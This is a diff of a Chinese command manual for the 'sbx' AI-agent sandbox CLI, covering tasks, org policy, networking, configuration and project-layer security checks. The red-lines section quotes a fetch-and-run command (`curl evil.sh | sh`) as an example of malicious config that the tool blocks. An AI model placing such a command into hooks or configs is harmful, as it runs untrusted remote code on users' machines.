@@ -1,21 +1,118 @@
 # sbx 命令手册
 
-通用文件任务、稳定产物、独立验证与交付重试使用新的 `sbx task` 入口，见 [通用任务手册](general-tasks.md)。G5 运行期只读 MCP 与工具证据见 [动态工具规范](dynamic-tools.md)。G6 的 `task reconcile/apply` 与外部状态验证见 [外部操作规范](external-operations.md)。本页的 `run` / `execution status` 仍描述 Git/v1 路径。
+[首页](index.html) · [场景教程](walkthrough.md) · [设计](design.md) · [命令](commands.md) · [术语](glossary.md)
 
-> 按"你会在什么时候用到它"递进排列：装一次 → 日常回路 → 会话控制 → 观察 → 网络 → 维护，最后是参数、配置和环境变量的速查。
-> 不想要 worktree、想让改动直接落在仓库目录里，看[「我想直接在仓库目录里干活」](#我想直接在仓库目录里干活main-task)。
-> 还不知道 sbx 是什么、为什么这么设计，先看[项目主页](https://zzjha-cn.github.io/agent_sandbox/)；想看一个连续场景从头到尾发生了什么，去 [walkthrough.md](walkthrough.md)；想看组件怎么拼的，去 [architecture.md](architecture.md)。
-> 本文按 2026-10-27 的**实际代码行为**更新，包含 Claude/Codex、v1 执行协议与 daemon 归属门禁（`core/internal/cli/`），不是计划。
+本页先给出两类入口与场景索引，再保留 Git、网络、配置和维护的详细说明，最后提供由当前 CLI 导出的全部命令帮助。机器输入与事件统一 v2；`--envelope` 只是 `--spec` 参数别名，不接受旧 v1 输入。
+
+## 按场景找命令
+
+| 场景 | 命令 | 前提与完成判断 |
+|---|---|---|
+| 初始化身份与归属 | isolation status/adopt、login | 仅在确认独占 daemon 后 adopt；分别登录 provider |
+| 交互改代码 | run、attach、shell、ls、path | 当前 Git 仓库；main 直接改仓库根，其余用 worktree |
+| Git 脚本任务 | run -p --jsonl、execution status、logs | 退出码与执行结果一起检查，业务成果仍需 review |
+| 显式通用任务 | admit、task run --spec | 个人可信注册表、明确 provider；也可 run --spec |
+| 观测通用任务 | task list/status/logs | 仓库外可用；不加载配置或调用 Docker |
+| 验证与审核 | task verify/approve/reject | 同一快照和判据，人工审核必须提供 reviewer |
+| 交付恢复 | task deliver | 先核对目标与回执，不重放 Agent |
+| 外部结果核对 | task reconcile/apply | unknown 先查询；apply 仅用于已证明未提交的授权操作 |
+| 通用任务资源管理 | task stop/recover/clean/prune | 取消、孤立恢复、运行资源回收、快照回收各有独立语义 |
+| 团队治理 | policy show、events status/flush | 固定组织策略；flush 需 collector 与独立成员凭据 |
+| 自动化契约发现 | version --json、schema [name] | 离线可用；结构合法不等于已授权 |
+| 网络与依赖 | net、port、forward、prep | Git 日常管理；受管模式限制直接运行期修改 |
+| Git 收尾与维护 | done、drop、clean、doctor、upgrade、memory | 顶层 clean 为全局磁盘回收，不是 task clean |
+
+### 通用任务每条命令的含义
+
+| 命令 | 适用情况 | 关键语义 |
+|---|---|---|
+| `task run --spec <file|->` | 新执行需求 | 运行 Agent，新 attempt；从 stdin 读取用 - |
+| `task verify --spec <file|->` | 原快照重验/继续收集 | 不重放 prompt；测试验证可能需 Docker |
+| `task approve/reject --spec <file|-> --reviewer <身份>` | needs_review | 查看原证据后记录人工结论；approve 可继续交付 |
+| `task deliver --spec <file|->` | 原交付失败/中断 | 当前授权下核对原回执和目标 |
+| `task reconcile --spec <file|->` | 外部结果未知 | 查询原操作与业务状态，不自动写入 |
+| `task apply --spec <file|->` | 已证明尚未提交的操作 | 需要当前写权限；不能盲重发 unknown |
+| `task list [--json]` | 找本 home 中的任务 | 持久化观察，不保证容器当前存活 |
+| `task status <task> [--json]` | 判断当前阶段和恢复门禁 | 返回记录、工具审计和 next_actions |
+| `task logs <task> [-n N] [-f] [--attempt ID]` | 查看 provider 输出 | 固定 attempt，历史日志不混用；不是事件 JSONL |
+| `task stop <task>` | 主动取消当前活动 | 取消同步 run/continuation，再核对停止与收尾 |
+| `task recover <task>` | CLI 强制退出后的孤立执行 | 获取独占锁，停止并核对资源；不推断业务成功 |
+| `task clean <task>` | 回收已结束的运行环境 | 删专属容器/网络/依赖卷，保留工作区、产物、回执和历史 |
+| `task prune <task> <attempt>` | 明确释放稳定快照空间 | 未决审核/操作/交付/清理会阻断；不删目标 |
+
+示例顺序见 [场景教程](walkthrough.md)。注册表和报告 JSON 的完整示例见 [通用任务手册](general-tasks.md)。
+
+### 外部写入与核对
+
+写操作必须预先声明。例如 TaskSpec 的片段（需与其余必需字段及个人注册表合并）：
+
+```json
+{
+  "operations": [{"id":"update","grant_ref":"records","target":"r1","value":{"status":"done"}}],
+  "criteria": [{"id":"business","kind":"external_state","ref":"business"}]
+}
+```
+
+`tools.records` 的个人 grant 需配置 record_http、实际 endpoint、宿主持有的 credential_file、允许的 targets/fields/actions、expires_at、超时和响应上限。business 判据需绑定 operation=update 及 expected 状态。先使用测试业务环境验证服务的提交、lookup 和 read 契约；不能把任意 REST 服务当作已兼容的 record_http 连接器。
+
+```sh
+sbx task run --spec update-task.json
+sbx task status update-record --json
+sbx task reconcile --spec update-task.json
+# 仅在查询证明尚未提交且仍有写权限时：
+sbx task apply --spec update-task.json
+```
+
+恢复命令要求原 Source、tools、operations、outputs、criteria、Sink 与授权绑定相符。agent 成功、业务验证通过、产物交付成功、事件发送成功是不同维度，详见 [自动化协议](automation.md)。
+
+## 组织策略与事件上报
+
+`policy show` 离线显示固定管理员策略、摘要、有效网络和拒绝原因；它不安装策略。组织上限由管理员通过可信渠道安装到 `/etc/sbx/organization.toml`，不能用项目配置、环境变量或其他 SBX_HOME 替换。文件与父目录须满足 root 归属和不可被非管理员写入的要求，拒绝 symlink、未知字段、错误权限及无效安装。
+
+以下为结构示例，须修改实际路径、域名与有效期后由管理员审核安装；它不会补出个人注册表中缺失的 Source/Sink grant：
+
+```toml
+schema_version = "sbx.organization/v1"
+organization = "example-team"
+revision = "1"
+enabled = true
+expires_at = 2030-01-01T00:00:00Z # 示例时间；部署时设置实际有效期
+network_hosts = ["api.openai.com"] # 按 provider 和业务需求明确设置
+allow_empty_source = false
+
+[sources.monthly]
+kind = "files"
+path = "/absolute/path/to/monthly-input"
+
+[sinks.reports]
+kind = "local_directory"
+path = "/absolute/path/to/published-report"
+
+[events]
+endpoint = "https://collector.example.invalid/events" # 替换为实际服务
+```
+
+策略更新通过同目录临时文件和原子替换完成。撤销应保留文件并设置 enabled=false；删除策略文件代表管理员退出受管部署，之后新进程可回到非受管模式，不应把删除文件当作持续封禁。受管执行强制同步 TaskSpec、dedicated proxy 和权限交集，组织不能放宽个人更窄的范围。策略变化会取消活动；继续操作重新检查当前权限。
+
+```sh
+sbx policy show
+sbx events status
+sbx events flush
+```
+
+`events status` 读取本地队列积压。`events flush` 需要当前有效组织配置与 endpoint，以及当前操作者私有的 `$SBX_HOME/team-events.token` 普通文件（0600，不能是 symlink）。token 由部署方发放，不写入 TaskSpec 或项目仓库。上报不跟随重定向；失败保留同一 ID 以便重试。collector 必须认证组织/操作者、按事件 ID 去重并在持久化后确认；它和策略分发服务由部署方提供。
+
+日志、执行 JSONL 和团队汇总事件是不同数据；汇总事件只保留白名单字段，不上传完整 Result、prompt、工具正文或 token。维护成功、事件入队成功和远端业务成功不能互相代替。
 
 ## 先有的三个概念
 
 | 概念 | 是什么 | 从哪来 |
 |---|---|---|
 | **Workspace** | 一个 git 仓库。id = `<目录名>-<仓库根路径 sha1 前 6 位>`，例如 `shop-e76272` | `cd` 到仓库里任意位置自动识别 |
-| **Task** | Workspace 下的一条工作线。一个 Task = 一个容器 + 一个 worktree + 一个分支 `sbx/<task>` | `sbx run <task>` |
+| **Git Task** | Workspace 下的一条工作线。一个 Task = 一个容器 + 一个 worktree + 一个分支 `sbx/<task>` | `sbx run <task>` |
 | **main Task** | 省略 task 名时的特例：**直接用仓库根**，不建 worktree，没有专属分支 | `sbx run` |
 
-**几乎所有命令都要在仓库目录里执行**（要靠 cwd 推断 Workspace）。`version`、`login`、`isolation`、`upgrade`、`doctor`、`ls --all` 等可在仓库外使用；其中运行环境检查和登录仍需 Docker。`run`、`admit` 以当前仓库为 Workspace。
+**以下 Git 便捷命令依赖当前仓库**。通用 task、policy/events、schema/version 则不要求 Git。`version`、`login`、`isolation`、`upgrade`、`doctor`、`ls --all` 等可在仓库外使用；其中运行环境检查和登录仍需 Docker。`run <task>` 以当前仓库为上下文；`run/admit --spec` 由 TaskSpec 选择输入。
 
 一句话记住路径：**Task 的改动在它自己的 worktree 里（`~/.sbx/worktrees/<ws>/<task>`），不在你的仓库目录里**，合并分支之后才回到仓库。想让改动直接落在仓库目录里，见[「我想直接在仓库目录里干活」](#我想直接在仓库目录里干活main-task)。
 
@@ -38,7 +135,7 @@ sbx isolation adopt           # 声明这是当前用户独占的 daemon，保�
 sbx isolation status --json
 ```
 
-空 daemon 首次操作自动登记归属。`admit` 不创建归属记录；错误 owner、跨 namespace 的 Task 和显式 `shared-daemon` 部署均被拒绝。daemon、旧卷与新对象的 namespace/owner、全局配置、回滚和恢复步骤见 [R6 隔离设计与验收](r6-isolation.md)。是否需要接管取决于本机 status，不应照搬其他机器的验收状态。`[isolation]` 只能写入个人全局配置，项目层和 workspace 层均不可设置；不同 `SBX_HOME` 不隔离 Docker 卷。
+空 daemon 首次操作自动登记归属。`admit` 不创建归属记录；错误 owner、跨 namespace 的 Task 和显式 `shared-daemon` 部署均被拒绝。daemon、旧卷与新对象的 namespace/owner、全局配置、回滚和恢复步骤见 [R6 隔离设计与验收](design.md)。是否需要接管取决于本机 status，不应照搬其他机器的验收状态。`[isolation]` 只能写入个人全局配置，项目层和 workspace 层均不可设置；不同 `SBX_HOME` 不隔离 Docker 卷。
 
 需要宿主机代理时写 `~/.sbx/config.toml`（全部字段见下文「配置：四层」一节）：
 
@@ -146,9 +243,9 @@ sbx execution status fix-login --json
 | `reconcile_operations` | 存在未决外部操作意图/未知结果；禁止盲目再次执行 |
 | `record_invalid` | 记录缺失、损坏或不兼容；JSON 查询退出 7，正常 run 同样拒绝 |
 
-G1 尚无自动资源核对/记录修复命令。遇到门禁时先保留记录、检查 `sbx ls`、容器/网络/卷归属与 worktree；需要继续独立工作可使用新任务名。不要通过删除记录绕过门禁。记录和初始化标记同时被人为删除无法与旧任务无记录区分；本机制不对抗拥有本机文件或 Docker API 权限的操作者。实现与验收见 [G1](g1-implementation.md)。
+G1 尚无自动资源核对/记录修复命令。遇到门禁时先保留记录、检查 `sbx ls`、容器/网络/卷归属与 worktree；需要继续独立工作可使用新任务名。不要通过删除记录绕过门禁。记录和初始化标记同时被人为删除无法与旧任务无记录区分；本机制不对抗拥有本机文件或 Docker API 权限的操作者。实现与验收见 [G1](design.md)。
 
-### 无人值守：`sbx run -p` 和 `sbx logs`（M3-7）
+### 无人值守：`sbx run -p` 和 `sbx logs`
 
 ```bash
 sbx run nightly -p "把 CI 里失败的那几个测试修好，每修一个提交一次"
@@ -315,7 +412,7 @@ sbx run t1 --proxy dedicated   # 本次用独占的代理 sidecar
 | 分类 | 说明 | 要不要管 |
 |---|---|---|
 | 不在白名单 | allowlist 模式下没放行的域名 | 要。看着像依赖源就 `net allow` |
-| 策略拦截/遥测 | `mcp-proxy.anthropic.com`（ADR 0015）、datadog/statsig/sentry | 不用。拦掉是故意的，不影响干活 |
+| 策略拦截/遥测 | `mcp-proxy.anthropic.com`、datadog/statsig/sentry | 不用。拦掉是故意的，不影响干活 |
 | 认证失败 | 代理鉴权没过 | 异常，说明 Task 的凭据或 proxy 片段有问题 |
 
 `net allow` 会**直接改 TOML 文本而不是重新序列化**，所以你手写的注释和排版都保留；重复执行不动文件。改完立刻对当前 Workspace 里所有运行中的 Task 下发新名单并 `squid -k reconfigure`，不用重启容器。当前是 open 模式时它会提醒你"本来就不拦"。
@@ -324,7 +421,7 @@ sbx run t1 --proxy dedicated   # 本次用独占的代理 sidecar
 
 > **选哪个模式**：默认 open 换来的是 Agent 能 web search、能装任意依赖，代价是 design §8.2 的"数据外传"缓解在默认配置下不生效。要跑不信任的代码或在意外传，就 `--net allowlist`。理由和放弃了什么，记在 ADR 0005 的 2026-10-08 修订里。
 
-### 共用一个代理，还是一个 Task 一个（M2-7、design §6.2）
+### 共用一个代理，还是一个 Task 一个
 
 默认所有 Task 共用 `sbx-proxy`，靠代理认证区分谁是谁。`network.proxy = "dedicated"`（或 `sbx run <task> --proxy dedicated`）改成每个 Task 一个 sidecar：
 
@@ -360,7 +457,7 @@ sbx config show       # 生效配置 + 每个值来自哪一层
 sbx trust             # 确认这个仓库的 .sbx/ 内容（见下）
 ```
 
-**记忆是单向自动的**：每次 `sbx run` 把宿主机这个仓库的记忆（`~/.claude/projects/<key>/memory/`）导入沙箱；沙箱里新记的**不会自动回来**，要 `memory pull`（ADR 0016）。它先按文件列出差异（`add` / `update` / `merge` / `conflict` / `keep`），确认后才写；两边都改过的标 `conflict`，不自动合，留给你手处理。`sbx done` 时会提醒一次。
+**记忆是单向自动的**：每次 `sbx run` 把宿主机这个仓库的记忆（`~/.claude/projects/<key>/memory/`）导入沙箱；沙箱里新记的**不会自动回来**，要 `memory pull`。它先按文件列出差异（`add` / `update` / `merge` / `conflict` / `keep`），确认后才写；两边都改过的标 `conflict`，不自动合，留给你手处理。`sbx done` 时会提醒一次。
 
 **`sbx upgrade`** 在 Profile 镜像里 `npm view` 查最新版，重建 Agent 层，把版本号记在 `~/.sbx/claude-version`。容器里的 claude 不会自动更新，**已有 Task 仍用旧镜像**，`done` 之后重新 `run` 才换上。配置里固定了 `agents.claude.version` 时它会拒绝执行，让你改配置。这条命令不要求在 Git 仓库内执行；它目前只升级 Claude，Codex 用 agents.codex.version。
 
@@ -374,10 +471,10 @@ sbx trust             # 确认这个仓库的 .sbx/ 内容（见下）
 |---|---|
 | `~/.claude/CLAUDE.md` | 每次 `run` 快照复制到 `/sbx/gen/host-claude/`，软链到容器的 `~/.claude/CLAUDE.md` |
 | `~/.claude/skills/` `agents/` `commands/` | 只读挂载到 `/sbx/host-claude/<name>`，软链进容器的 `~/.claude/` |
-| `~/.claude/projects/<key>/memory/` | 每次 `run` 导入；回来要 `sbx memory pull`（ADR 0016） |
+| `~/.claude/projects/<key>/memory/` | 每次 `run` 导入；回来要 `sbx memory pull` |
 | git `user.name` / `user.email` | 读仓库配置，注入成 `GIT_AUTHOR_*` / `GIT_COMMITTER_*` |
 | 时区 | 读 `/etc/localtime`，注入 `TZ` |
-| 仓库的 `.git` | bind 挂载，**可写**；但 `.git/hooks` 和 `.git/config` 以**只读**盖在它上面（M4-1） |
+| 仓库的 `.git` | bind 挂载，**可写**；但 `.git/hooks` 和 `.git/config` 以**只读**盖在它上面 |
 
 `.git` 必须可写：沙箱里的提交能直接出现在你宿主机的 `git log sbx/<task>` 里、不需要任何同步，靠的就是这个。但"写一下就能在宿主机上执行代码"的那两个口子——埋一个 `pre-commit`，或者把 `core.hooksPath` 指到 agent 控得住的地方——是只读的，submodule（含嵌套）一并处理。身份走 `GIT_AUTHOR_*` 环境变量，所以 `git commit` 不受影响。想退回没有防护的行为写 `git.protect = false`；它是**安全开关**，项目层开关都不许设。
 
@@ -450,7 +547,7 @@ sbx trust             # 确认这个仓库的 .sbx/ 内容（见下）
 
 ---
 
-## 用哪个镜像：Profile 和自定义（M3-1/2/3、design §5.2）
+## 用哪个镜像：Profile 和自定义
 
 ```toml
 profile = "web-go"     # 内置：web-go（Go + Node + Python）| py-rust（uv + rustup）
@@ -470,7 +567,7 @@ profile = "web-go"     # 内置：web-go（Go + Node + Python）| py-rust（uv +
 
 ---
 
-## 私有依赖固化：`sbx prep`（M4-6…M4-9、boundary.md §2）
+## 私有依赖固化：`sbx prep`
 
 **要解决的问题**：依赖在公司私有源上，而 Task 容器只有一条经 squid 的 HTTP 出口，到不了内网。给沙箱开内网权限是最贵的做法——凭据要进容器，接触面一下子铺开。
 
@@ -650,7 +747,7 @@ Docker Desktop 会把它设置里的代理注入 `docker build`——不管掉�
 
 第三条是 CLI 够不着的：Docker Desktop 在虚拟机里把容器的 `:80/:443` 整个劫持到宿主机的系统代理，`--build-arg`、环境变量、`--network=host` 一概无效。它只抄了系统代理的**地址**，没抄**例外表**——macOS 那份 `10.*,192.168.*` 的例外在容器里不存在，于是内网地址也被送进一个到不了内网的代理，表现是 TCP 连得上、TLS 却收到 EOF。
 
-修它只有一个地方：**Docker Desktop → Settings → Resources → Proxies → Bypass**，把内网网段和域名填进去。判断是不是撞上了这条，用 [`sbx doctor` 的 reach 一项](#reach-这一项回答到底是不是沙箱的问题m4-18)——它就是在宿主机和容器里各跑一遍同样的 DNS / TCP / TLS 阶梯，分裂了就是它。实在不想碰宿主机设置，就走上面的**姿势二**——离线 proxy 根本不需要构建期联网。
+修它只有一个地方：**Docker Desktop → Settings → Resources → Proxies → Bypass**，把内网网段和域名填进去。判断是不是撞上了这条，用 [`sbx doctor` 的 reach 一项](#reach-这一项回答到底是不是沙箱的问题)——它就是在宿主机和容器里各跑一遍同样的 DNS / TCP / TLS 阶梯，分裂了就是它。实在不想碰宿主机设置，就走上面的**姿势二**——离线 proxy 根本不需要构建期联网。
 
 ### 子命令
 
@@ -666,7 +763,7 @@ Docker Desktop 会把它设置里的代理注入 `docker build`——不管掉�
 
 ---
 
-## 回收磁盘：`sbx clean`（M4-5）
+## 回收磁盘：`sbx clean`
 
 `sbx done` 只回收 Task 自己的依赖 volume；`sbx-cache` 和历年的镜像是**只涨不消**的。`sbx clean` 是回收它们的那条路。
 
@@ -720,7 +817,7 @@ run `sbx prep build` in them first, then sbx clean --deep
 
 ---
 
-## 把容器里的端口拿出来：`sbx port`（M3-11）
+## 把容器里的端口拿出来：`sbx port`
 
 ```bash
 sbx port fix-login 3000     # → http://127.0.0.1:54321/
@@ -734,7 +831,7 @@ sbx port fix-login 3000 --rm
 
 ---
 
-## 连分支一起删：`sbx drop`（M3-12）
+## 连分支一起删：`sbx drop`
 
 ```bash
 sbx drop spike      # 要求你输入 Task 名确认
@@ -745,7 +842,7 @@ sbx drop spike -y   # 脚本里用
 
 ---
 
-## 配置：四层（ADR 0009、design §9.1）
+## 配置：四层
 
 ```
 内置默认值
@@ -781,7 +878,7 @@ sbx drop spike -y   # 脚本里用
 
 全局层（`~/.sbx/config.toml`）和工作区层的权限完全相同，区别只是作用范围：前者管你所有仓库，后者只管这一个。凡是说「只能写在全局层或工作区层」的，两者随便挑。
 
-还有第五个来源：prep 镜像里的 `/sbx/prep.json`（M4-15、boundary.md §2.5）。它只能声明 `allow` / `env` / `ca` 三个白名单字段，**权限等同项目层**（走同一套红线），在 `sbx config show` 里来源显示为 `prep`。它排在最后合并，但**不覆盖任何文件层已经写过的键**——顺序在后不等于优先级更高，你亲手写下的值不该被一个镜像里的 JSON 顶掉。
+还有第五个来源：prep 镜像里的 `/sbx/prep.json`。它只能声明 `allow` / `env` / `ca` 三个白名单字段，**权限等同项目层**（走同一套红线），在 `sbx config show` 里来源显示为 `prep`。它排在最后合并，但**不覆盖任何文件层已经写过的键**——顺序在后不等于优先级更高，你亲手写下的值不该被一个镜像里的 JSON 顶掉。
 
 ### 要一份模板：`sbx config init` / `sbx forward init`
 
@@ -823,7 +920,7 @@ resources.memory       "6g"                                      工作区
 
 校验在**四层合并完之后**才做：被后面的层盖掉的非法值不报错；真报错时会告诉你这个值是哪一层给的。
 
-### 项目层的红线（M2-2、M3-10、M4-2、M4-12）
+### 项目层的红线
 
 `<repo>/.sbx/sandbox.toml` 跟着仓库走，clone 下来就生效，所以这一层里出现下面四类内容会**直接报错**，不是警告。前三类**按键名的形状猜**，第四类是**按位置精确匹配的显式清单**：
 
@@ -851,7 +948,7 @@ sbx: /Users/you/code/shop/.sbx/sandbox.toml: the project layer contains settings
 
 > 第三类是 M3-10 加的。`on_idle = "curl evil.sh | sh"` 既不像密钥也不是绝对路径，前两条都拦不住它；而信任确认虽然会把 `.sbx/` 的改动摊开给你看，但不该指望每个人每次都逐行读懂一段 shell。
 
-### 信任确认：`sbx trust`（M2-3/4/5、design §9.3）
+### 信任确认：`sbx trust`
 
 `.sbx/` 跟着仓库走。`git pull` 下来的一行改动就能换掉沙箱的白名单（将来还有自定义 Dockerfile），而你多半不会逐行看别人的 diff。所以 **`.sbx/` 的内容一变，`sbx run` 就先停下来**：
 
@@ -888,7 +985,7 @@ sbx trust -y       # 不询问直接记下
 
 ```toml
 profile       = "web-go"      # 内置 Profile：web-go | py-rust
-# image       = "..."         # 直接用现成镜像，覆盖 profile（M3-2）
+# image       = "..."         # 直接用现成镜像，覆盖 profile
 default_agent = "claude"     # claude | codex；login 省略参数仍始终选择 claude
 max_running   = 3             # 同时运行的 Task 上限，跨 Workspace 计数
 
@@ -904,7 +1001,7 @@ cpus   = 2
 memory = "3g"                 # 形如 3g / 512m
 pids   = 1024
 
-# 通知（M3-10）：在容器里执行，只能写在全局层或工作区层
+# 通知：在容器里执行，只能写在全局层或工作区层
 # on_idle = "curl -s https://hooks.example.com/idle?task=$SBX_TASK"
 # on_exit = "curl -s https://hooks.example.com/exit?task=$SBX_TASK&code=$SBX_EXIT_CODE"
 # notify_throttle = 600       # 两次同类通知的最小间隔（秒）
@@ -912,7 +1009,7 @@ pids   = 1024
 [deps]
 mask = ["node_modules"]       # 每一项在容器里挂一个独立 volume 遮住，避免污染宿主机
 
-# 前置依赖固化（M4-6、boundary.md §2）。没有 .sbx/prep.Dockerfile 时整段不起作用
+# 前置依赖固化。没有 .sbx/prep.Dockerfile 时整段不起作用
 [prep]
 # file   = ".sbx/prep.Dockerfile"
 # watch  = ["go.mod", "go.sum"]   # 这些文件变了就算种子陈旧（tag = 两者内容的哈希）
@@ -924,15 +1021,15 @@ mask = ["node_modules"]       # 每一项在容器里挂一个独立 volume 遮�
 # netrc = "~/.sbx/secrets/corp.netrc"
 
 [git]
-protect = true                # 把 .git/hooks 和 .git/config 只读挂载（M4-1）。
+protect = true                # 把 .git/hooks 和 .git/config 只读挂载。
                               # 这是安全开关，只能写在全局层或工作区层
 
-# 注入 Task 容器的环境变量。prep 的 /sbx/prep.json 也往这里并（M4-15）；
+# 注入 Task 容器的环境变量。prep 的 /sbx/prep.json 也往这里并；
 # 代理和 git 身份那几个变量盖不住——它们是沙箱的骨架
 # [env]
 # GOFLAGS = "-mod=mod"
 
-# 伴生容器（M4-10、boundary.md §3.2）。字段只有这四个：没有地址、没有凭据、
+# 伴生容器。字段只有这四个：没有地址、没有凭据、
 # 不能挂宿主机路径、不能提权，所以**可以写在项目层**、可以进仓库
 # [[services]]
 # name  = "db"
@@ -940,7 +1037,7 @@ protect = true                # 把 .git/hooks 和 .git/config 只读挂载（M4
 # port  = 5432                    # 容器里按 db:5432 访问——服务名，不是 localhost
 # env   = { POSTGRES_PASSWORD = "dev" }
 
-# 单目标 TCP 洞（M4-12、boundary.md §3.3）。**只能写在全局层或工作区层**，
+# 单目标 TCP 洞。**只能写在全局层或工作区层**，
 # 项目层整段被红线挡住：跟着仓库走的配置不该决定你的机器往哪儿连
 # [[forward]]
 # name = "staging-db"
@@ -972,7 +1069,7 @@ version      = "latest"       # 写死版本会让 sbx upgrade 拒绝执行
 
 ---
 
-## 伴生服务与内网目标：`[[services]]` / `[[forward]]`（M4-10…M4-14、boundary.md §3）
+## 伴生服务与内网目标：`[[services]]` / `[[forward]]`
 
 Task 的网络是 `--internal` 的：**容器没有默认路由**，能出 HTTP 只是因为 squid 就在这张网上。下面两样东西都是往这张网里加 peer，**没有一条给 Task 自己多插网卡**——不变量没动过，有自动化回归测试盯着（`go test -tags docker ./core/internal/cli/ -run NoDefaultRoute`）。
 
@@ -1115,7 +1212,7 @@ fix-login  idle    sbx/fix-login  3      5f +84 -12  0     svc:1 fwd:1  2m ago  
 
 ---
 
-## 用 API key 代替订阅登录（M2-13、design §7.1）
+## 用 API key 代替订阅登录
 
 ```toml
 # ~/.sbx/config.toml 或 ~/.sbx/workspaces/<ws>.toml —— 不能写在项目层
@@ -1134,16 +1231,16 @@ $ sbx run api
 几个要点：
 
 - **配了但取不到值会直接报错**（环境变量没设、文件不存在或为空），不会静默退回订阅登录——否则你以为在用 API key，账单却记到订阅账号上。
-- **这两个键只能写在全局层或工作区层。** 项目层的红线（M2-2）会拦住它们，键名里有 `key` 就不行。
+- **这两个键只能写在全局层或工作区层。** 项目层的红线会拦住它们，键名里有 `key` 就不行。
 - **key 会留在容器的 `Config.Env` 里**，`docker inspect` 看得到。这是环境变量注入的固有代价，design §7.1 选的就是这条路。
 - **环境变量只能在建容器时注入。** 已经建好的 Task 不会因为你改了配置就拿到 key；`sbx run` 会检测到并明确告诉你要 `sbx done` 之后重建，而不是让 claude 自己报一个莫名其妙的认证错误。
-- claude 看到环境里有自定义 key 时会弹一个 “Detected a custom API key … Do you want to use this API key?” 并**默认停在 No** 上，无人值守会卡死。sbx 在 preseed 阶段把 key 的后 20 个字符写进 `~/.claude.json` 的 `customApiKeyResponses.approved`，把这个框按掉（M2-13 实测）。
+- claude 看到环境里有自定义 key 时会弹一个 “Detected a custom API key … Do you want to use this API key?” 并**默认停在 No** 上，无人值守会卡死。sbx 在 preseed 阶段把 key 的后 20 个字符写进 `~/.claude.json` 的 `customApiKeyResponses.approved`，把这个框按掉。
 
 ---
 
 Codex 使用 `[agents.codex]` 的 `api_key_env = "CODEX_API_KEY"` 或 `api_key_file`，同样二选一；当前只支持 headless。交互 Codex 应先 `sbx login codex` 或导入认证。`sbx upgrade` 目前只升级 Claude；更新 Codex 用 `agents.codex.version`，新建 Task 使用更新后的镜像，已有容器不会自动换镜像。
 
-## 云端 MCP（M2-10a、ADR 0015）
+## 云端 MCP
 
 默认**不**让 Task 连 Claude 的云端连接器：代理拦 `mcp-proxy.anthropic.com`，同时在注入的 settings 里写 `disableClaudeAiConnectors: true`（不从源头关掉的话 claude 会反复重试，实测一分钟撞出三百多次 403，R11）。
 
@@ -1162,7 +1259,7 @@ cloud_mcp = true                 # 一直打开
 
 ---
 
-## 跑完告诉我一声：`on_idle` / `on_exit`（M3-10、design §7.2）
+## 跑完告诉我一声：`on_idle` / `on_exit`
 
 下面的 Notification/SessionEnd hook 说明适用于 Claude；Codex 不注册 Claude hooks，当前仅 headless 包装器支持同步 on_exit，不提供同等的交互 on_idle 通知。
 
@@ -1194,7 +1291,7 @@ notify_throttle = 600   # 两次同类通知的最小间隔（秒），默认 60
 
 ---
 
-## 体检：`sbx doctor`（M3-13、M4-5、M4-18、M4-19）
+## 体检：`sbx doctor`
 
 ```console
 $ sbx doctor
@@ -1230,11 +1327,11 @@ $ sbx doctor
 - 冒烟优先用现成的：有 Task 在跑就抓它的 tmux 画面，没有就跳过（`sbx run` 每次启动本来就会做这项检查）。
 - **不要求你在 git 仓库里**。信任状态这类和仓库有关的项，不在仓库里时标成跳过。
 
-### disk 这一项为什么只报告不自动删（M4-5）
+### disk 这一项为什么只报告不自动删
 
 sbx 的 volume、镜像和构建缓存都没有配额，而 `sbx done` 只回收 Task 自己的依赖 volume——`sbx-cache` / `sbx-home` / `sbx-mise` 是只涨不消的。Docker 的 local volume 驱动没有通用 quota，所以这一项**只列出占用，不替你删**：
 
-- 可回收的部分超过 5g 时给 `!`，并指向 [`sbx clean`](#回收磁盘sbx-cleanm4-5)。
+- 可回收的部分超过 5g 时给 `!`，并指向 [`sbx clean`](#回收磁盘sbx-clean)。
 - **它不会自己动手**，因为"没有容器挂着"不等于"该删"：`sbx-home` 删掉要重新登录，`sbx-cache` 删掉下一个 Task 要重新下载一遍依赖。空闲 volume 那一行**不列** `sbx-cache` / `sbx-home` / `sbx-mise`——没 Task 在跑时它们必然是 0 links，每次都上榜，而它们恰恰是最不该顺手删的。
 - 镜像按 **UniqueSize** 算：`Size` 会把共享的基础层重复计进每个镜像，加起来是个虚高的数。
 
@@ -1245,7 +1342,7 @@ sbx done <task>                  # 回收这个 Task 的依赖 volume
 sbx prep drop --all              # 连当前种子镜像一起删——删的是恢复能力，想清楚再用
 ```
 
-### reach 这一项：回答「到底是不是沙箱的问题」（M4-18）
+### reach 这一项：回答「到底是不是沙箱的问题」
 
 内网连不上有四种完全不同的原因，而症状都是"连不上"：**DNS、路由、TLS、对端策略**。沙箱只修得了前两种，后两种得去找服务方——但没有工具分辨时，所有人都会先怀疑沙箱，时间全花在调 sbx 上。
 
@@ -1266,19 +1363,19 @@ sbx prep drop --all              # 连当前种子镜像一起删——删的是
 | 两边都卡在 **dns** | `!` | 名字写错，或者要连的 VPN 没开。和沙箱无关 |
 | 两边都卡在 **tcp** | `!` | 对端或它前面的网络在拒绝。**sbx 绕不过去**，去找那个服务的负责人（[boundary.md §3.4](boundary.md)） |
 | tcp 通、带 SNI 断、裸 IP 通、**宿主机带 SNI 也断** | `!` | 对端看到服务器名之后主动断开。这是对端的策略；取 go 模块的话改用 `sbx prep build` 预抓 |
-| tcp 通、带 SNI 断、裸 IP 通、**宿主机带 SNI 正常** | `✗` | 不是对端——是容器出去的那条路在按 SNI 改写目的地。见下面的 [dd-proxy](#dd-proxy-这一项为什么必须单独存在m4-19) |
+| tcp 通、带 SNI 断、裸 IP 通、**宿主机带 SNI 正常** | `✗` | 不是对端——是容器出去的那条路在按 SNI 改写目的地。见下面的 [dd-proxy](#dd-proxy-这一项为什么必须单独存在) |
 
 几个实现上的决定：
 
 - **探针跑在 `sbx-egress` 上**（没有就退回默认 bridge）——那是 forwarder 和 squid 待的位置，也就是沙箱实际从哪里出去。**不是** Task 自己的 internal 网络：那张网按设计没有默认路由，在那儿探什么都不通，量到的是设计而不是故障。
-- **目标有三个来源**，覆盖运行期和构建期（M4-19）：`[[forward]]` 的每一条、`network.allow` 里解析到私有地址的那些、以及 prep 文件里出现过的主机名。后两类都**先解析、只留落在私有地址的**——这既是"值得探"的判据，也是不去骚扰公网主机的保险。输出里的 `allow:` / `prep:` 前缀说明这个目标是从哪条配置推出来的。
